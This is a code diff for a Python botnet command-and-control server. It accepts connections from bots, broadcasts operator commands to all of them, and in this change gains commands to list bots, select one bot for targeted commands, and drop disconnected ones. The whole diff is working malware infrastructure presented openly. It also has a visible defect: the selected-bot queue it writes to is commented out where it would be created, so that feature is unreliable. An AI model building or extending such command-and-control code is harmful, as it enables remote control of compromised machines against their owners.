@@ -5,6 +5,7 @@ import threading
 import time
 from datetime import datetime
 threads = []
+threadsDic = {}
 contador = [1]
 estado = [0]
 principalQueue = queue.Queue()
@@ -17,8 +18,12 @@ def createDirectories():
         print("[-]",ex)
         os._exit(0)
 
+def names():
+    for i in range(len(threads)):
+        print("[{}]{}\n".format(i,threads[i].getName()))
+
 def helpFunc():
-    print("[+] AYUDA [+]\ncount \t-->\t Cantidad de bots conectados\nchange \t-->\t Cambiar el estado de salida de datos\nexit \t-->\t Cerrar todas las conexiones y salir del programa")
+    print("[+] AYUDA [+]\ncount \t\t-->\t Cantidad de bots conectados\nchange \t\t-->\t Cambiar el estado de salida de datos\nnames \t\t-->\t Listar los nombres de los bots conectados\nselect [bot]\t --> \t Selecciona a un unico bot\nexit \t\t-->\t Cerrar todas las conexiones y salir del programa")
 
 def count():
     print("[+] Hay un total de [{}] bots conectados!!\n".format(len(threads)))
@@ -41,6 +46,19 @@ class  serverThread(threading.Thread):
         threading.Thread.__init__(self,name='Server')
         self.principalQueue = queueServer
 
+    def selectBot(self,botThread):
+        while True:
+            consoleSndSelect = str(input('[select --> {}]$ '.format(botThread.getName())))
+            if(consoleSndSelect == "exit"):
+                    print('[-] Volviendo al seleccionar a todos ...\n')
+                    break
+            elif(consoleSndSelect == "change"):
+                change()
+
+            else:
+                print('[+] Enviando comando al bot <{}>'.format(botThread.getName()))
+                botThread.selectQueue.append(consoleSndSelect)
+
     def run(self):
         while True:
             consoleSnd = str(input('[BotNet]$ '))
@@ -55,36 +73,49 @@ class  serverThread(threading.Thread):
 
             elif(consoleSnd == "change"):
                 change()
+    
+            elif(consoleSnd == "names"):
+                names()
 
             elif(consoleSnd == "exit"):
                 for i in range(len(threads)):
                     self.principalQueue.put(consoleSnd)
                     time.sleep(0.1)
-                time.sleep(1)
+                time.sleep(0.5)
                 os._exit(0)
+
+            elif(consoleSnd.split(" ")[0] == "select"):
+                for work in threads:
+                    if(consoleSnd.split(" ")[1] == work.getName()):
+                        self.selectBot(work)
+                        break
+                else:
+                    print('[-] No se encontro ninguna coincidencia con el nombre <{}>'.format(consoleSnd.split(" ")[1]))
 
             else:
                 print('[+] Enviando comando ::{}:: a {} bots'.format(consoleSnd,str(len(threads))))
                 for i in range(len(threads)):
                     time.sleep(0.1)
                     self.principalQueue.put(consoleSnd)
-                time.sleep(1.5)
+                time.sleep(1)
 
 class botThread(threading.Thread):
     def __init__(self,bot,botAddress,queue):
-        self.botName = "Bot#"+str(contador)
+        self.botName = "Bot#"+str(contador[0])
+        self.id = contador[0]
         threading.Thread.__init__(self,name=self.botName)
         self.botIP = botAddress[0]
         self.botPort = botAddress[1]
         self.bot = bot
         self.botAddress = botAddress
         self.principalQueue = queue
+        #self.selectQueue = []
 
     def run(self):
-        contador[0] = contador[0] + 1
         nameBot = threading.current_thread().getName()
         print('[+] Conexion proveniente::{}:{} conectandon con {}'.format(str(self.botIP),str(self.botPort),nameBot))
         while True:
+            #executeBotCmd = self.selectQueue.pop()
             executeBotCmd = self.principalQueue.get()
             try:
                 #executeBotCmd+= "\n"
@@ -96,7 +127,9 @@ class botThread(threading.Thread):
                 if(estado[0] == 0):
                     print("{} Responde:\n".format(nameBot),ansBot)
             except Exception as ex:
-                print('[-] Error al ejecutar el comando <{}>'.format(ex))
+                print('\n[-] El bot llamado: {} se ha desconectado...'.format(nameBot))
+                threads.remove(threadsDic[self.id])
+                #print('[-] Error al ejecutar el comando <{}>'.format(ex))
                 break
 
 def handler(port,host,queue):
@@ -113,6 +146,8 @@ def handler(port,host,queue):
         (bot,botAddress) = server.accept()
         newBot = botThread(bot,botAddress,principalQueue)
         threads.append(newBot)
+        threadsDic[contador[0]] = newBot
+        contador[0] = contador[0]+1
         newBot.start()
 
 def main():
